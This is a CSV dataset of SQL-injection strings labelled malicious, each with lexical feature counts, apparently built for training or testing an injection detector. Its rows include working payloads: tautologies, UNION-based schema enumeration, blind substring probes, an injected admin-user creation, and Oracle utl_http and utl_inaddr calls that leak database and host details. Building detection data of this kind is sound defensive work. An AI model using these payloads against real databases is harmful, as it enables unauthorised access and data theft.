Sentence,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
a' ,1,3,1,1,0,1,0,0,1,0,0,0,0,0,1,0,0,0
a' --,1,5,2,1,0,3,1,0,1,0,0,2,0,0,1,0,0,0
a' or 1 = 1; --,1,15,6,1,0,5,1,0,5,0,1,2,0,0,3,2,0,0
@,1,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0
' and 1 = 0 )  union all,1,24,8,1,0,3,0,0,7,0,1,0,0,0,11,2,0,0
? or 1 = 1 --,1,13,6,0,0,4,1,0,5,0,1,2,0,0,2,2,0,0
x' and userid is null; --,1,25,6,1,0,4,1,0,5,0,1,2,1,0,16,0,1,0
x' and email is null; --,1,24,6,1,0,4,1,0,5,0,1,2,1,0,15,0,1,0
anything' or 'x' = 'x,1,21,5,4,0,5,0,0,4,0,1,0,0,0,12,0,0,0
x' and 1 =  ( select count ( * )  from tabname ) ; --,1,53,15,1,0,10,1,0,14,0,1,3,0,0,26,1,0,2
x' and members.email is null; --,1,32,6,1,0,5,1,0,5,0,1,2,1,0,22,0,1,0
x' or full_name like '%bob%,1,27,5,2,0,5,0,0,4,2,1,0,0,0,18,0,0,0
23 or 1 = 1; --,1,15,6,0,0,4,1,0,5,0,1,2,0,0,2,4,0,0
1' or '1' = '1,1,14,5,4,0,5,0,0,4,0,1,0,0,0,2,3,0,0
1'1,1,3,1,1,0,1,0,0,0,0,0,0,0,0,0,2,0,0
1 exec sp_  ( or exec xp_ ) ,1,28,8,0,0,4,0,0,8,0,1,0,0,0,14,1,0,0
1 and 1 = 1,1,11,5,0,0,1,0,0,4,0,1,0,0,0,3,3,0,0
1' and 1 =  ( select count ( * )  from tablenames ) ; --,1,56,15,1,0,10,1,0,14,0,1,3,0,0,28,2,0,2
\'; desc users; --,1,18,4,1,0,5,1,0,3,0,0,2,0,0,9,0,0,0
1\'1,1,4,1,1,0,1,0,0,0,0,0,0,0,0,0,2,0,0
1' and non_existant_table  =  '1,1,32,5,2,0,5,0,0,4,0,1,0,0,0,19,2,0,0
' or username is not null or username  =  ',1,43,10,2,0,3,0,0,9,0,3,0,1,0,29,0,1,0
"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1,116,28,2,0,14,0,0,27,0,1,0,0,0,60,7,0,2
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1,74,12,2,0,11,1,0,11,0,0,2,0,0,43,7,0,1
1 uni/**/on select all from where,1,33,6,0,0,4,0,1,5,0,0,2,0,0,23,1,0,1
'||utl_http.request ( 'http://192.168.1.1/' ) ||',1,49,5,4,0,19,0,0,4,0,2,2,0,0,18,8,0,0
"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1,52,9,6,0,14,0,0,8,0,2,0,0,0,29,0,0,0
' and 1 = utl_inaddr.get_host_address  (  (  select banner from v$version where rownum = 1  )  )   and 'i' = 'i,1,111,21,4,0,16,0,0,20,0,2,0,0,0,66,2,0,1
' and 1 = utl_inaddr.get_host_address  (  (  select sys.login_user from dual  )  )   and 'i' = 'i,1,97,17,4,0,16,0,0,16,0,2,0,0,0,57,1,0,1
' and 1 = utl_inaddr.get_host_address  (  (  select sys.database_name from dual  )  )   and 'i' = 'i,1,100,17,4,0,16,0,0,16,0,2,0,0,0,60,1,0,1
' and 1 = utl_inaddr.get_host_address  (  (  select host_name from v$instance  )  )   and 'i' = 'i,1,98,17,4,0,16,0,0,16,0,2,0,0,0,58,1,0,1
' and 1 = utl_inaddr.get_host_address  (  (  select global_name from global_name  )  )   and 'i' = 'i,1,101,17,4,0,16,0,0,16,0,2,0,0,0,61,1,0,1
